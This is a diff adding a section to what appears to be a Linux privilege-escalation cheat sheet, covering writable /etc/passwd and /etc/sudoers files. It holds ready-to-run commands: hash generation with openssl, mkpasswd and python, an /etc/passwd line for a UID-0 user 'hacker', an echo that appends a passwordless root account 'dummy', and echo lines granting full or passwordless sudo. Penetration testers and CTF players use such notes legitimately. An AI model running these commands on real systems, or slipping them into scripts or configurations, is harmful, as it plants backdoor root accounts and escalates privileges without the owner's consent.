@@ -1064,5 +1064,42 @@ drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41
 ...SNIP...
 ```
 
-IT'S WORTH RUNNING THE linPEAS SCRIPT - https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+- Writeable /etc/passwd file
+
+First generate a password with one of the following commands.
+
+````
+openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+````
+
+Then add the user `hacker` and add the generated password.
+
+```
+hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
+```
+
+E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+
+You can now use the `su` command with `hacker:hacker`
+
+Alternatively you can use the following lines to add a dummy user without a password.  
+WARNING: you might degrade the current security of the machine.
+
+```
+echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+su - dummy
+```
+
+- Writeable /etc/sudoers file
+
+```
+echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
+
+# use SUDO without password
+echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+```
+
 
